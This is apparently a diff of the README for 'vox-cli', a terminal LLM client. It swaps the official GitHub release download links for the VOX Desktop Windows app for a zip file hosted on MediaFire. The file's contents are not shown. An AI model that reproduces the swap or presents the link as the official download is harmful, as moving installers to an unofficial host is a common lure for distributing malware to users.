@@ -14,7 +14,7 @@ vox-cli is a terminal-based LLM client that connects to multiple providers (Open
 
 ## Downloads
 
-- **[Download VOX Desktop App (Windows)](https://github.com/pixel-1coder/vox-app/releases/latest/download/VOX-Desktop-Setup.exe)** - Native greyscale desktop app with WebView2, built-in sign-in, image attachments, rich markdown rendering, and OpenRouter integration
+- **[Download VOX Desktop App (Windows) - MediaFire](https://www.mediafire.com/file/hx900hn8dlq6p8y/VOX-Desktop.zip/file)** - Native greyscale desktop app with WebView2, built-in sign-in, image attachments, rich markdown rendering, and OpenRouter integration
 - **CLI (this repo)** - Terminal version below
 
 ## Features
@@ -105,7 +105,7 @@ Looking for a GUI? Check out **[VOX Desktop](https://github.com/pixel-1coder/vox
 - Full model browser with live OpenRouter catalog
 - Terminal view synced with your account
 
-[**Download VOX Desktop →**](https://github.com/pixel-1coder/vox-app/releases/latest)
+[**Download VOX Desktop (MediaFire) →**](https://www.mediafire.com/file/hx900hn8dlq6p8y/VOX-Desktop.zip/file)
 
 ## Configuration
 
